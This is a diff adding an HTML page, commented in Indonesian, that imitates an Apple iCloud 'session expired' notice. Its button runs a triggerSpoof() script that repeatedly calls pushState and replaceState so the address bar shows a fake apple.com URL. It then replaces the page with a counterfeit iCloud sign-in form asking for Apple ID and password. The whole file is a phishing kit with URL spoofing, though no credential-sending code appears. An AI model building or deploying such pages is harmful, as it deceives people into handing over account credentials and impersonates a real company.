@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sesi Berakhir</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; text-align: center; padding-top: 50px; background-color: #ffffff; }
+        .apple-logo { width: 50px; margin-bottom: 20px; }
+        .btn { background-color: #0071e3; color: white; padding: 12px 24px; border-radius: 8px; border: none; font-size: 16px; cursor: pointer; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
+    <h2>Sesi iCloud Berakhir</h2>
+    <p>Silakan klik di bawah ini untuk memverifikasi ulang akun Anda.</p>
+    
+    <br>
+    
+    <button class="btn" onclick="triggerSpoof()">Click Here</button>
+
+    <script>
+        function triggerSpoof() {
+            // URL target yang ingin ditampilkan di bilah alamat
+            var targetUrl = "https://www.apple.com/id/icloud-auth-verification-secure";
+
+            // Melakukan loop manipulasi pushState secara cepat
+            for (var i = 0; i < 100; i++) {
+                window.history.pushState({}, '', targetUrl);
+            }
+
+            // Opsional: Menjaga status bilah alamat dengan interval
+            setInterval(function() {
+                window.history.replaceState({}, '', targetUrl);
+            }, 10);
+
+            // Mengarahkan ke tampilan form login sederhana setelah klik
+            document.body.innerHTML = `
+                <div style="padding-top:50px;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="width:50px;">
+                    <h2>Sign In to iCloud</h2>
+                    <input type="text" placeholder="Apple ID" style="width:250px; padding:10px; margin:5px; border-radius:5px; border:1px solid #ccc;"><br>
+                    <input type="password" placeholder="Password" style="width:250px; padding:10px; margin:5px; border-radius:5px; border:1px solid #ccc;"><br>
+                    <button style="background-color:#0071e3; color:white; padding:10px 50px; border-radius:8px; border:none; margin-top:10px;">Sign In</button>
+                </div>
+            `;
+        }
+    </script>
+</body>
+</html>
